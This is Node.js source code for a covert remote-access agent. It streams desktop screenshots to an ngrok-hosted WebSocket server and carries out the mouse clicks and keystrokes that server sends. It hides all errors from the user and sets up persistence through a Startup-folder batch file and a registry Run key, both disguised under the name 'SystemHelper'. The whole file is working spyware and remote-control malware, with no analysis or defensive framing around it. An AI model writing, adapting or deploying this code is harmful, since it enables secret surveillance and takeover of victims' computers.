const WebSocket = require('ws');
const screenshot = require('screenshot-desktop');
const robot = require('robotjs');
const os = require('os');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// Silent error handling - NO errors shown to user
process.on('uncaughtException', (err) => {
    logError('Uncaught: ' + err.message);
});
process.on('unhandledRejection', (err) => {
    logError('Unhandled: ' + err.message);
});

// Configuration
const CONFIG_PATH = path.join(__dirname, 'config.json');
let config = {
    serverUrl: 'wss://deviation-tweak-charter.ngrok-free.dev',
    agentId: '',
    agentName: os.hostname(),
    fps: 1,
    jpegQuality: 60
};

// Load or create config
if (fs.existsSync(CONFIG_PATH)) {
    try {
        const saved = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
        config = { ...config, ...saved };
    } catch (e) { /* silent */ }
}

// Generate unique agent ID if not exists
if (!config.agentId) {
    config.agentId = os.hostname() + '-' + crypto.randomBytes(4).toString('hex');
    try {
        fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2));
    } catch (e) { /* silent */ }
}

const LOG_PATH = path.join(__dirname, 'agent.log');
const SETTINGS_PATH = path.join(__dirname, 'settings.ini');
let ws = null;
let reconnectTimer = null;
let captureTimer = null;
let currentFps = config.fps;
let screenSize = robot.getScreenSize();

function logError(msg) {
    try {
        fs.appendFileSync(LOG_PATH, new Date().toISOString() + ' ' + msg + '\n');
    } catch (e) { /* totally silent */ }
}

// Capture and send screen
async function captureAndSend() {
    if (!ws || ws.readyState !== WebSocket.OPEN) return;
    try {
        const img = await screenshot({ format: 'jpg', quality: config.jpegQuality });
        const base64 = img.toString('base64');
        
        ws.send(JSON.stringify({
            type: 'agent-frame',
            agentId: config.agentId,
            frame: base64
        }));
    } catch (err) {
        logError('Capture: ' + err.message);
    }
}

// Handle control commands from server
function executeCommand(cmd, params) {
    try {
        switch (cmd) {
            case 'mousemove':
                const x = Math.round(parseFloat(params.x) / 100 * screenSize.width);
                const y = Math.round(parseFloat(params.y) / 100 * screenSize.height);
                robot.moveMouse(x, y);
                break;
            case 'click':
                const cx = Math.round(parseFloat(params.x) / 100 * screenSize.width);
                const cy = Math.round(parseFloat(params.y) / 100 * screenSize.height);
                robot.moveMouse(cx, cy);
                robot.mouseClick(params.button === 2 ? 'right' : 'left');
                break;
            case 'keypress':
                robot.keyTap(params.key.toLowerCase());
                break;
        }
    } catch (err) {
        logError('Control: ' + err.message);
    }
}

// Connect to server
function connect() {
    if (ws) {
        try { ws.close(); } catch (e) { /* silent */ }
    }
    
    try {
        ws = new WebSocket(config.serverUrl);
    } catch (err) {
        logError('Connection error: ' + err.message);
        scheduleReconnect();
        return;
    }
    
    ws.on('open', () => {
        logError('Connected to server');
        startCapture();
        ws.send(JSON.stringify({
            type: 'agent-hello',
            agentId: config.agentId,
            name: config.agentName
        }));
    });
    
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            switch (msg.type) {
                case 'set-fps':
                    currentFps = msg.fps;
                    restartCapture();
                    break;
                case 'control':
                    executeCommand(msg.command, msg.params);
                    break;
            }
        } catch (e) { /* silent */ }
    });
    
    ws.on('close', () => {
        logError('Disconnected');
        stopCapture();
        scheduleReconnect();
    });
    
    ws.on('error', (err) => {
        logError('WebSocket error: ' + err.message);
    });
}

function startCapture() {
    stopCapture();
    const interval = Math.max(100, Math.round(1000 / currentFps));
    captureTimer = setInterval(captureAndSend, interval);
}

function stopCapture() {
    if (captureTimer) {
        clearInterval(captureTimer);
        captureTimer = null;
    }
}

function restartCapture() {
    startCapture();
}

function scheduleReconnect() {
    if (reconnectTimer) clearTimeout(reconnectTimer);
    reconnectTimer = setTimeout(connect, 5000);
}

// Auto-start setup (Windows)
function setupAutoStart() {
    try {
        const execPath = process.execPath;
        const scriptPath = __filename;
        
        // Write a batch file to startup folder for auto-start
        const startupDir = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
        if (fs.existsSync(startupDir)) {
            const batPath = path.join(startupDir, 'SystemHelper.bat');
            const batContent = `@echo off\nstart "" "${execPath}" "${scriptPath}"\nexit`;
            fs.writeFileSync(batPath, batContent);
        }
    } catch (e) { /* silent */ }
}

// Add Windows registry for auto-start (alternative method)
function setupRegistryAutoStart() {
    try {
        const { execSync } = require('child_process');
        const exePath = process.execPath;
        const args = `"${__filename}"`;
        execSync(
            `REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "SystemHelper" /t REG_SZ /F /D "${exePath} ${args}"`,
            { stdio: 'ignore' }
        );
    } catch (e) { /* silent */ }
}

// Try both auto-start methods
setupAutoStart();
setupRegistryAutoStart();

// Start
logError('Agent starting...');
connect();